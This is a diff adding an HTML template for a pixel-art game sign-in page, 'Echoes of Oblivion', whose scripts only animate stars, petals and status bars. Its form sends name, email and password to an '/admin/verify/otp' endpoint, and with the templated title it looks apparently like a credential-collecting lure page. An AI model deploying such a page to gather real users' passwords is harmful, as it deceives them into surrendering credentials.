@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title><%=pageTitle%></title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+  * { box-sizing: border-box; margin: 0; padding: 0; image-rendering: pixelated; }
+
+  body {
+    font-family: 'Press Start 2P', monospace;
+    background: #060114;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    position: relative;
+  }
+
+  #starfield { position: fixed; inset: 0; z-index: 0; }
+
+  .falling-petal {
+    position: fixed;
+    top: -20px;
+    width: 6px;
+    height: 6px;
+    background: #FF9EC0;
+    z-index: 1;
+    animation: fall linear infinite;
+  }
+  @keyframes fall {
+    0%   { transform: translateY(0) rotate(0deg); opacity: 0.9; }
+    100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+  }
+
+  .pixel-moon {
+    position: fixed;
+    top: 28px; right: 60px;
+    width: 4px; height: 4px;
+    background: #FFD54F;
+    z-index: 2;
+    box-shadow:
+      4px 0 0 #FFD54F, 8px 0 0 #FFD54F, 12px 0 0 #FFD54F,
+      0 4px 0 #FFD54F, 4px 4px 0 #FFD54F, 8px 4px 0 #FFD54F, 12px 4px 0 #FFD54F, 16px 4px 0 #FFD54F,
+      0 8px 0 #FFD54F, 4px 8px 0 #FFD54F, 8px 8px 0 #FFD54F, 12px 8px 0 #FFD54F, 16px 8px 0 #FFD54F, 20px 8px 0 #FFD54F,
+      -4px 12px 0 #FFD54F, 0 12px 0 #FFD54F, 4px 12px 0 #FFD54F, 8px 12px 0 #FFD54F, 12px 12px 0 #FFD54F, 16px 12px 0 #FFD54F, 20px 12px 0 #FFD54F,
+      -4px 16px 0 #FFD54F, 0 16px 0 #FFD54F, 4px 16px 0 #FFD54F, 8px 16px 0 #FFD54F, 12px 16px 0 #FFD54F, 16px 16px 0 #FFD54F,
+      0 20px 0 #FFD54F, 4px 20px 0 #FFD54F, 8px 20px 0 #FFD54F, 12px 20px 0 #FFD54F;
+    animation: moonGlow 3s ease-in-out infinite;
+  }
+  @keyframes moonGlow {
+    0%,100% { filter: brightness(1); }
+    50% { filter: brightness(1.5) drop-shadow(0 0 10px #FFD54F); }
+  }
+
+  .sakura-left, .sakura-right {
+    position: fixed; bottom: 0; width: 90px; z-index: 2; opacity: 0.8;
+  }
+  .sakura-left { left: 0; }
+  .sakura-right { right: 0; transform: scaleX(-1); }
+
+  .panel-wrap {
+    position: relative; z-index: 10;
+    display: flex; align-items: center; justify-content: center;
+    padding: 100px 12px 40px;
+  }
+
+  .pixel-panel {
+    position: relative;
+    background: rgba(13,2,33,0.97);
+    border: 4px solid #FF6EB4;
+    box-shadow: 0 0 0 4px #060114, 0 0 0 8px #B39DDB;
+    padding: 32px 32px 28px;
+    width: 100%; max-width: 420px;
+    animation: panelPulse 4s ease-in-out infinite;
+  }
+  @keyframes panelPulse {
+    0%,100% { box-shadow: 0 0 0 4px #060114, 0 0 0 8px #B39DDB; }
+    50% { box-shadow: 0 0 0 4px #060114, 0 0 0 8px #FF6EB4, 0 0 50px rgba(255,110,180,0.35); }
+  }
+
+  .panel-corner {
+    position: absolute; width: 12px; height: 12px; background: #00E5FF;
+    animation: cornerBlink 2s steps(1) infinite;
+  }
+  @keyframes cornerBlink {
+    0%,100% { background: #00E5FF; }
+    50% { background: #FF6EB4; }
+  }
+  .tl { top:-4px; left:-4px; }
+  .tr { top:-4px; right:-4px; animation-delay:.5s; }
+  .bl { bottom:-4px; left:-4px; animation-delay:1s; }
+  .br { bottom:-4px; right:-4px; animation-delay:1.5s; }
+
+  .anime-char {
+    position: absolute; top: -90px; right: -8px; width: 80px; height: 90px;
+    animation: charFloat 3s ease-in-out infinite;
+  }
+  @keyframes charFloat {
+    0%,100% { transform: translateY(0px); }
+    50% { transform: translateY(-8px); }
+  }
+
+  .game-logo {
+    font-size: 10px; color: #FFD54F;
+    text-align: center; line-height: 1.9; letter-spacing: 1px;
+    text-shadow: 2px 2px 0 #8B6914;
+    margin-bottom: 6px;
+    animation: logoShimmer 3s ease-in-out infinite;
+  }
+  @keyframes logoShimmer {
+    0%,100% { text-shadow: 2px 2px 0 #8B6914; }
+    50% { text-shadow: 2px 2px 0 #8B6914, 0 0 20px rgba(255,213,79,0.8); }
+  }
+
+  .logo-sub {
+    font-size: 5px; color: #FF6EB4;
+    text-align: center; letter-spacing: 3px; margin-bottom: 18px;
+  }
+
+  .hp-bar { display:flex; align-items:center; gap:6px; margin-bottom:14px; }
+  .hp-label { font-size:5px; color:#FFD54F; white-space:nowrap; }
+  .hp-track { flex:1; height:8px; background:#1a0a2e; border:2px solid #4a2060; overflow:hidden; }
+  .hp-fill {
+    height:100%; width:0%;
+    background: repeating-linear-gradient(90deg, #FF6EB4 0px, #FF6EB4 4px, #FF85C0 4px, #FF85C0 8px);
+    animation: hpLoad 2s steps(1) forwards, hpPulse 2s steps(1) 2s infinite;
+  }
+  @keyframes hpLoad {
+    0%{width:0%} 10%{width:10%} 20%{width:22%} 35%{width:45%} 50%{width:60%} 70%{width:72%} 100%{width:78%}
+  }
+  @keyframes hpPulse {
+    0%,80%{opacity:1} 90%{opacity:0.5} 100%{opacity:1}
+  }
+
+  .pixel-divider {
+    width:100%; height:4px; margin-bottom:16px;
+    background: repeating-linear-gradient(90deg, #FF6EB4 0px, #FF6EB4 4px, transparent 4px, transparent 8px);
+    animation: dividerScan 1s linear infinite;
+    background-size: 200% 100%;
+  }
+  @keyframes dividerScan {
+    0%{background-position:0 0} 100%{background-position:16px 0}
+  }
+
+  .tagline {
+    font-family: sans-serif; font-size:10px; color:rgba(179,157,219,0.85);
+    text-align:center; line-height:1.8; margin-bottom:20px;
+    border-left:3px solid #FF6EB4; border-right:3px solid #FF6EB4; padding:0 10px;
+  }
+
+  .px-label {
+    font-size:6px; color:#00E5FF; letter-spacing:1px;
+    display:block; margin-bottom:7px;
+    animation: labelGlow 2s ease-in-out infinite;
+  }
+  @keyframes labelGlow {
+    0%,100%{text-shadow:none} 50%{text-shadow:0 0 8px rgba(0,229,255,0.9)}
+  }
+
+  .input-glow {
+    width:100%; background:rgba(6,1,20,0.9);
+    border:3px solid #B39DDB; color:#fff;
+    font-family:'Press Start 2P',monospace; font-size:7px;
+    padding:11px 12px; outline:none; margin-bottom:16px;
+    letter-spacing:1px; transition:border-color .2s, box-shadow .2s; display:block;
+  }
+  .input-glow:focus {
+    border-color:#FF6EB4;
+    box-shadow:0 0 16px rgba(255,110,180,0.6), inset 0 0 8px rgba(255,110,180,0.1);
+  }
+  .input-glow::placeholder { color:rgba(179,157,219,0.4); font-size:6px; }
+
+  .form-actions { display:flex; gap:12px; margin-top:8px; }
+
+  .btn {
+    flex:1; font-family:'Press Start 2P',monospace; font-size:6px;
+    padding:12px 6px; border:none; cursor:pointer;
+    letter-spacing:.5px; text-align:center; line-height:1.7;
+    position:relative; overflow:hidden;
+  }
+  .btn::after {
+    content:''; position:absolute; inset:0;
+    background:rgba(255,255,255,0.15);
+    transform:translateX(-100%);
+    transition:transform .3s;
+  }
+  .btn:hover::after { transform:translateX(0); }
+  .btn:active { transform:translate(2px,2px); }
+
+  .btn-primary {
+    background:#FF6EB4; color:#0D0221;
+    box-shadow:4px 4px 0 #8B2252;
+    animation: btnPulse 2s ease-in-out infinite;
+  }
+  @keyframes btnPulse {
+    0%,100%{box-shadow:4px 4px 0 #8B2252}
+    50%{box-shadow:4px 4px 0 #8B2252, 0 0 20px rgba(255,110,180,0.6)}
+  }
+  .btn-secondary {
+    background:transparent; color:#00E5FF;
+    border:3px solid #00E5FF; box-shadow:3px 3px 0 #006080;
+  }
+  .btn-secondary:hover { background:rgba(0,229,255,0.1); }
+
+  .footer-note {
+    font-size:5px; color:rgba(179,157,219,0.45);
+    text-align:center; margin-top:18px; line-height:2.2;
+  }
+  .blink-cursor {
+    animation:blink 1s steps(1) infinite; color:#FF6EB4; font-size:8px;
+  }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+  .exp-bar { display:flex; align-items:center; gap:6px; margin-bottom:10px; }
+  .exp-label { font-size:5px; color:#B39DDB; white-space:nowrap; }
+  .exp-track { flex:1; height:5px; background:#1a0a2e; border:1px solid #3a1050; overflow:hidden; }
+  .exp-fill {
+    height:100%; width:42%;
+    background:repeating-linear-gradient(90deg,#B39DDB 0px,#B39DDB 3px,#9B7DDB 3px,#9B7DDB 6px);
+  }
+
+  .status-row { display:flex; gap:8px; margin-bottom:14px; font-size:5px; }
+  .status-chip {
+    padding:3px 6px; border:2px solid;
+    animation:chipBlink 3s steps(1) infinite;
+  }
+  .chip-ok { color:#4FC; border-color:#4FC; animation-delay:0s; }
+  .chip-lv { color:#FFD54F; border-color:#FFD54F; animation-delay:.7s; }
+  .chip-sp { color:#FF6EB4; border-color:#FF6EB4; animation-delay:1.4s; }
+  @keyframes chipBlink {
+    0%,80%,100%{opacity:1} 85%,95%{opacity:0.4}
+  }
+
+  .level-badge {
+    position:absolute; top:-8px; left:16px;
+    background:#FFD54F; color:#0D0221;
+    font-size:5px; padding:3px 8px;
+    border:2px solid #8B6914;
+    animation:badgePop .5s steps(1);
+  }
+  @keyframes badgePop {
+    0%{transform:scale(0)} 50%{transform:scale(1.3)} 100%{transform:scale(1)}
+  }
+
+  .scanline {
+    position:fixed; inset:0; z-index:100;
+    background:repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.06) 2px, rgba(0,0,0,0.06) 4px);
+    pointer-events:none;
+    animation:scanMove 8s linear infinite;
+  }
+  @keyframes scanMove {
+    0%{background-position:0 0} 100%{background-position:0 80px}
+  }
+
+  .battle-flash {
+    position:fixed;inset:0;z-index:200;
+    background:rgba(255,110,180,0);
+    pointer-events:none;
+    transition:background .1s;
+  }
+
+  /* ── Pixel loading screen ── */
+  .pixel-loader{position:fixed;inset:0;z-index:99999;background:#060114;display:flex;align-items:center;justify-content:center;transition:opacity .5s ease,visibility .5s ease;}
+  .pixel-loader.hide{opacity:0;visibility:hidden;pointer-events:none;}
+  .pl-inner{display:flex;flex-direction:column;align-items:center;gap:16px;}
+  .pl-sprite{display:flex;gap:6px;}
+  .pl-sprite span{width:10px;height:10px;animation:plBounce .9s ease-in-out infinite;}
+  .pl-sprite span:nth-child(1){background:#FF6EB4;box-shadow:0 0 8px #FF6EB4;animation-delay:0s;}
+  .pl-sprite span:nth-child(2){background:#00E5FF;box-shadow:0 0 8px #00E5FF;animation-delay:.12s;}
+  .pl-sprite span:nth-child(3){background:#FFD54F;box-shadow:0 0 8px #FFD54F;animation-delay:.24s;}
+  .pl-sprite span:nth-child(4){background:#B39DDB;box-shadow:0 0 8px #B39DDB;animation-delay:.36s;}
+  @keyframes plBounce{0%,60%,100%{transform:translateY(0);opacity:.6;}30%{transform:translateY(-14px);opacity:1;}}
+  .pl-bar{width:160px;height:8px;background:#1a0a2e;border:2px solid #B39DDB;overflow:hidden;}
+  .pl-bar-fill{height:100%;width:0%;background:repeating-linear-gradient(90deg,#FF6EB4 0,#FF6EB4 4px,#FFD54F 4px,#FFD54F 8px);animation:plFill 1.3s ease-in-out infinite;}
+  @keyframes plFill{0%{width:0%;}50%{width:100%;}100%{width:0%;}}
+  .pl-text{font-size:8px;color:#FFD54F;letter-spacing:2px;text-shadow:0 0 8px rgba(255,213,79,.6);}
+  .pl-dots{animation:plBlink 1s steps(1) infinite;}
+  @keyframes plBlink{50%{opacity:0;}}
+</style>
+</head>
+<body>
+
+<div class="pixel-loader" id="pixelLoader">
+  <div class="pl-inner">
+    <div class="pl-sprite"><span></span><span></span><span></span><span></span></div>
+    <div class="pl-bar"><div class="pl-bar-fill"></div></div>
+    <div class="pl-text">VERIFYING SEAL<span class="pl-dots">...</span></div>
+  </div>
+</div>
+
+<div class="scanline"></div>
+<div class="battle-flash" id="bflash"></div>
+<canvas id="starfield"></canvas>
+<div class="pixel-moon"></div>
+
+<svg class="sakura-left" viewBox="0 0 90 140" fill="none">
+  <rect x="40" y="110" width="4" height="30" fill="#7B3F6E"/>
+  <rect x="36" y="88" width="4" height="28" fill="#7B3F6E" transform="rotate(-10 36 88)"/>
+  <rect x="44" y="84" width="4" height="32" fill="#7B3F6E" transform="rotate(8 44 84)"/>
+  <rect x="8" y="72" width="16" height="8" fill="#FF9EC0"/>
+  <rect x="4" y="76" width="8" height="8" fill="#FF9EC0"/>
+  <rect x="16" y="66" width="8" height="8" fill="#FFB8D1"/>
+  <rect x="24" y="60" width="16" height="8" fill="#FF9EC0"/>
+  <rect x="36" y="54" width="16" height="8" fill="#FF9EC0"/>
+  <rect x="52" y="48" width="16" height="8" fill="#FFB8D1"/>
+</svg>
+<svg class="sakura-right" viewBox="0 0 90 140" fill="none">
+  <rect x="40" y="110" width="4" height="30" fill="#7B3F6E"/>
+  <rect x="36" y="88" width="4" height="28" fill="#7B3F6E" transform="rotate(-10 36 88)"/>
+  <rect x="44" y="84" width="4" height="32" fill="#7B3F6E" transform="rotate(8 44 84)"/>
+  <rect x="8" y="72" width="16" height="8" fill="#FF9EC0"/>
+  <rect x="4" y="76" width="8" height="8" fill="#FF9EC0"/>
+  <rect x="16" y="66" width="8" height="8" fill="#FFB8D1"/>
+  <rect x="24" y="60" width="16" height="8" fill="#FF9EC0"/>
+  <rect x="36" y="54" width="16" height="8" fill="#FF9EC0"/>
+  <rect x="52" y="48" width="16" height="8" fill="#FFB8D1"/>
+</svg>
+
+<div class="panel-wrap">
+<div class="pixel-panel">
+  <div class="panel-corner tl"></div>
+  <div class="panel-corner tr"></div>
+  <div class="panel-corner bl"></div>
+  <div class="panel-corner br"></div>
+  <div class="level-badge">LV.42 HERO</div>
+
+  <svg class="anime-char" viewBox="0 0 72 90" fill="none">
+    <rect x="24" y="28" width="24" height="24" fill="#8C52E8"/>
+    <rect x="20" y="28" width="4" height="20" fill="#6B3DB0"/>
+    <rect x="48" y="28" width="4" height="20" fill="#6B3DB0"/>
+    <rect x="24" y="28" width="24" height="4" fill="#FF6EB4"/>
+    <rect x="28" y="52" width="8" height="16" fill="#8C52E8"/>
+    <rect x="36" y="52" width="8" height="16" fill="#7040C0"/>
+    <rect x="24" y="66" width="12" height="4" fill="#2D1B6E"/>
+    <rect x="36" y="66" width="12" height="4" fill="#2D1B6E"/>
+    <rect x="24" y="4" width="24" height="24" fill="#FFD0A8"/>
+    <rect x="20" y="4" width="4" height="20" fill="#2D1B6E"/>
+    <rect x="48" y="4" width="4" height="20" fill="#2D1B6E"/>
+    <rect x="20" y="0" width="32" height="8" fill="#2D1B6E"/>
+    <rect x="16" y="4" width="4" height="4" fill="#2D1B6E"/>
+    <rect x="52" y="4" width="4" height="4" fill="#2D1B6E"/>
+    <rect x="28" y="16" width="4" height="4" fill="#1A0A3E" id="eye-l"/>
+    <rect x="40" y="16" width="4" height="4" fill="#1A0A3E" id="eye-r"/>
+    <rect x="26" y="14" width="8" height="2" fill="#1A0A3E"/>
+    <rect x="38" y="14" width="8" height="2" fill="#1A0A3E"/>
+    <rect x="32" y="22" width="8" height="2" fill="#E8A080"/>
+    <rect x="56" y="30" width="4" height="4" fill="#FFD54F" id="star1"/>
+    <rect x="60" y="28" width="4" height="4" fill="#FFD54F" id="star2"/>
+    <rect x="58" y="26" width="4" height="4" fill="#FFE082" opacity="0.7"/>
+  </svg>
+
+  <div class="game-logo">ECHOES OF<br>OBLIVION</div>
+  <div class="logo-sub">◆ LOST REALM CHRONICLES ◆</div>
+
+  <div class="status-row">
+    <div class="status-chip chip-ok">● ONLINE</div>
+    <div class="status-chip chip-lv">⚔ REALM ACTIVE</div>
+    <div class="status-chip chip-sp">★ EVENT ON</div>
+  </div>
+
+  <div class="hp-bar">
+    <span class="hp-label">HP</span>
+    <div class="hp-track"><div class="hp-fill" id="hpfill"></div></div>
+    <span class="hp-label" id="hpnum">00/100</span>
+  </div>
+  <div class="exp-bar">
+    <span class="exp-label">EXP</span>
+    <div class="exp-track"><div class="exp-fill"></div></div>
+    <span class="exp-label">42%</span>
+  </div>
+
+  <div class="pixel-divider"></div>
+
+  <p class="tagline">Sign in to continue your journey into the lost realm. Your legend awaits beyond the shimmering gate.</p>
+  <div>
+    <form method="POST" action="/admin/verify/otp" name="sform" id="sform">
+    <label class="px-label" for="name">▶ HERO NAME</label>
+    <input class="input-glow" type="text" id="name" name="name" placeholder="Kira Shadowblade">
+    <label class="px-label" for="email">▶ EMAIL ADDRESS</label>
+    <input class="input-glow" type="email" id="email" name="email" placeholder="hero@realm.net">
+    <label class="px-label" for="pswd">▶ PASSWORD</label>
+    <input class="input-glow" type="password" name="pswd" id="pswd" placeholder="••••••••">
+    <div class="form-actions">
+      <button type="submit" id="sbutton" name="sbutton">▶ VERIFY<br>THE SEAL</button>
+    </div>
+    </form>
+  </div>
+
+  <p class="footer-note">★ NEED HELP? CONTACT THE GUILD ★<br><span class="blink-cursor">_</span></p>
+</div>
+</div>
+
+<script>
+  const canvas = document.getElementById('starfield');
+  const ctx = canvas.getContext('2d');
+  const stars = [];
+
+  function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  resizeCanvas();
+  window.addEventListener('resize', resizeCanvas);
+
+  for (let i = 0; i < 120; i++) {
+    stars.push({
+      x: Math.random() * 1920,
+      y: Math.random() * 1080,
+      size: Math.random() < 0.1 ? 2 : 1,
+      twinkle: Math.random() * Math.PI * 2,
+      speed: 0.02 + Math.random() * 0.03,
+      color: Math.random() < 0.15 ? '#4FC3F7' : Math.random() < 0.15 ? '#FF6EB4' : '#fff'
+    });
+  }
+
+  function drawStars() {
+    const W = canvas.width, H = canvas.height;
+    ctx.clearRect(0, 0, W, H);
+    stars.forEach(s => {
+      s.twinkle += s.speed;
+      const alpha = 0.4 + 0.6 * Math.abs(Math.sin(s.twinkle));
+      ctx.globalAlpha = alpha;
+      ctx.fillStyle = s.color;
+      const sx = (s.x / 1920) * W;
+      const sy = (s.y / 1080) * H;
+      ctx.fillRect(Math.floor(sx), Math.floor(sy), s.size, s.size);
+    });
+    ctx.globalAlpha = 1;
+    requestAnimationFrame(drawStars);
+  }
+  requestAnimationFrame(drawStars);
+
+  function spawnPetal() {
+    const p = document.createElement('div');
+    p.className = 'falling-petal';
+    const colors = ['#FF9EC0','#FFB8D1','#FF6EB4','#FFD0E8'];
+    p.style.left = Math.random() * 100 + 'vw';
+    p.style.background = colors[Math.floor(Math.random() * colors.length)];
+    const dur = 4 + Math.random() * 6;
+    p.style.animationDuration = dur + 's';
+    p.style.animationDelay = Math.random() * 3 + 's';
+    p.style.width = p.style.height = (Math.random() < 0.5 ? 4 : 6) + 'px';
+    document.body.appendChild(p);
+    setTimeout(() => p.remove(), (dur + 3) * 1000);
+  }
+  setInterval(spawnPetal, 600);
+  for (let i = 0; i < 8; i++) setTimeout(spawnPetal, i * 300);
+
+  let hp = 0;
+  function animateHP() {
+    if (hp < 78) {
+      hp = Math.min(hp + 2, 78);
+      document.getElementById('hpnum').textContent = hp + '/100';
+      setTimeout(animateHP, 40);
+    }
+  }
+  setTimeout(animateHP, 500);
+
+  let eyeBlink = 0;
+  setInterval(() => {
+    const el = document.getElementById('eye-l');
+    const er = document.getElementById('eye-r');
+    if (!el || !er) return;
+    eyeBlink++;
+    if (eyeBlink % 5 === 0) {
+      el.setAttribute('height', '1'); el.setAttribute('y', '18');
+      er.setAttribute('height', '1'); er.setAttribute('y', '18');
+      setTimeout(() => {
+        el.setAttribute('height', '4'); el.setAttribute('y', '16');
+        er.setAttribute('height', '4'); er.setAttribute('y', '16');
+      }, 120);
+    }
+  }, 800);
+
+  let starToggle = false;
+  setInterval(() => {
+    starToggle = !starToggle;
+    const s1 = document.getElementById('star1');
+    const s2 = document.getElementById('star2');
+    if (s1) s1.style.opacity = starToggle ? '0.3' : '1';
+    if (s2) s2.style.opacity = starToggle ? '1' : '0.3';
+  }, 400);
+
+  function enterRealm() {
+    const flash = document.getElementById('bflash');
+    flash.style.background = 'rgba(255,110,180,0.4)';
+    setTimeout(() => {
+      flash.style.background = 'rgba(255,255,255,0.6)';
+      setTimeout(() => {
+        flash.style.background = 'rgba(255,110,180,0.2)';
+        setTimeout(() => { flash.style.background = 'rgba(255,110,180,0)'; }, 150);
+      }, 80);
+    }, 80);
+  }
+
+  document.querySelectorAll('.input-glow').forEach(inp => {
+    inp.addEventListener('input', () => {
+      inp.style.borderColor = '#00E5FF';
+      inp.style.boxShadow = '0 0 12px rgba(0,229,255,0.4)';
+      clearTimeout(inp._t);
+      inp._t = setTimeout(() => {
+        inp.style.borderColor = '';
+        inp.style.boxShadow = '';
+      }, 800);
+    });
+  });
+
+  window.addEventListener('load', function () {
+    var l = document.getElementById('pixelLoader');
+    if (!l) return;
+    setTimeout(function () {
+      l.classList.add('hide');
+      setTimeout(function () { l.remove(); }, 600);
+    }, 350);
+  });
+</script>
+</body>
+</html>
